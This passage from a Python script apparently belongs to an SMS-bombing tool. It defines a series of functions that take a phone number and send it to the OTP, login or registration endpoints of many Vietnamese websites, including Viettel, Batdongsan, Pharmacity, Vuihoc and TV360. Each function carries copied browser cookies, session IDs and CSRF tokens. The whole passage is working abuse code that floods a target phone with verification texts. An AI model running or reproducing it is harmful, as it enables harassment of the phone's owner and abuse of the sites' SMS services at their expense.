    'skip_noti': 'true',
    'security_hash': '30c8d654d31afc803c9248dd7db005ec',
    'is_ajax': '1',
}

   response = requests.post('https://www.tatmart.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
def vuihoc(phone):
   cookies = {
    'VERSION': '1',
    'WEB_LOP': '1',
    'duo_theme_json': '{"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/anh-bia-khoa-hoc.png","holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/cdn-tet-animation.js","start_time":"2024-01-29 00:00:00","end_time":"2024-02-17 00:00:00"}',
    '_gid': 'GA1.2.121155666.1723109800',
    '_gat_UA-133956209-1': '1',
    '_gat_gtag_UA_133956209_1': '1',
    '_ga_PR7QKZ61KC': 'GS1.1.1723109800.1.1.1723109955.42.0.0',
    '_ga': 'GA1.1.1744769498.1723109800',
    '_ga_4BW81DWTX0': 'GS1.1.1723109800.1.1.1723109955.43.0.0',
}

   headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'VERSION=1; WEB_LOP=1; duo_theme_json={"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/anh-bia-khoa-hoc.png","holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/cdn-tet-animation.js","start_time":"2024-01-29 00:00:00","end_time":"2024-02-17 00:00:00"}; _gid=GA1.2.121155666.1723109800; _gat_UA-133956209-1=1; _gat_gtag_UA_133956209_1=1; _ga_PR7QKZ61KC=GS1.1.1723109800.1.1.1723109955.42.0.0; _ga=GA1.1.1744769498.1723109800; _ga_4BW81DWTX0=GS1.1.1723109800.1.1.1723109955.43.0.0',
    'origin': 'https://vuihoc.vn',
    'priority': 'u=1, i',
    'referer': 'https://vuihoc.vn/user/verifyAccountkitSMS?phone=+84856738291&typeOTP=1',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   data = {
    'mobile': phone,
}

   response = requests.post('https://vuihoc.vn/service/security/sendOTPSMS', cookies=cookies, headers=headers, data=data)
def vinwonder(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://booking.vinwonders.com',
    'priority': 'u=1, i',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'UserName': phone,
    'channel': 10,
}

   response = requests.post(
    'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/check-user',
    headers=headers,
    json=json_data,
)
def mainguyen(phone):
   headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://member.mainguyen.vn',
    'Referer': 'https://member.mainguyen.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'content-type': 'application/json',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   params = {
    'guestKey': 'dde60be3eb3859db4a4f15351134c991',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://api.mainguyen.vn/auth/customer/request-otp', params=params, headers=headers, json=json_data)
def giathuoctot(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://giathuoctot.com',
    'priority': 'u=1, i',
    'referer': 'https://giathuoctot.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phoneNo': phone,
}

   response = requests.post('https://api.giathuoctot.com/user/otp', headers=headers, json=json_data)
def tv360(phone):
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
  }
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
def robot(phone):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
}

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def fb(phone):
    cookies = {
    'con.unl.lat': '1720112400',
    'con.unl.sc': '1',
    '_gid': 'GA1.3.2048602791.1720189695',
    '_tt_enable_cookie': '1',
    '_ttp': 'loSwVu_AC7yj50Md2HhAQPUajHo',
    '_clck': 'k364l7%7C2%7Cfn7%7C0%7C1647',
    '_fbp': 'fb.2.1720189698853.917828572155116943',
    '_hjSessionUser_1708983': 'eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
    '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1',
    '_gcl_au': '1.1.888803755.1720189704',
    'con.ses.id': '684bd57c-05df-40e6-8f09-cb91b12b83ee',
    '_cfuvid': '7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000',
    '_gat_UA-3729099-1': '1',
    '_hjSession_1708983': 'eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
    '_hjHasCachedUserAttributes': 'true',
    '__gads': 'ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg',
    '__gpi': 'UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ',
    '__eoi': 'ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu',
    'cf_clearance': 'CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A',
    'ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D',
    'ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D',
    '_ga': 'GA1.3.697835917.1720189695',
    '_clsk': 'lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect',
    'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D',
    'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D',
    '_ga_HTS298453C': 'GS1.1.1720194528.2.1.1720194561.27.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    # 'cookie': 'con.unl.lat=1720112400; con.unl.sc=1; _gid=GA1.3.2048602791.1720189695; _tt_enable_cookie=1; _ttp=loSwVu_AC7yj50Md2HhAQPUajHo; _clck=k364l7%7C2%7Cfn7%7C0%7C1647; _fbp=fb.2.1720189698853.917828572155116943; _hjSessionUser_1708983=eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1; _gcl_au=1.1.888803755.1720189704; con.ses.id=684bd57c-05df-40e6-8f09-cb91b12b83ee; _cfuvid=7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; __gads=ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg; __gpi=UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ; __eoi=ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu; cf_clearance=CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A; ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D; ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D; _ga=GA1.3.697835917.1720189695; _clsk=lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D; _ga_HTS298453C=GS1.1.1720194528.2.1.1720194561.27.0.0',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'phoneNumber': phone,
}

    response = requests.get(
    'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
    params=params,
    cookies=cookies,
    headers=headers,
)

def dvcd(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

###
def myvt(phone):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

##

###

###
def phar(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/json',
    'origin': 'https://www.pharmacity.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.pharmacity.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-device-id': '940de2f9-82d3-4790-bd9f-23d7c957ac26',
    'x-device-platform': 'Chrome',
    'x-device-platform-version': '127.0.0.0',
}

   json_data = {
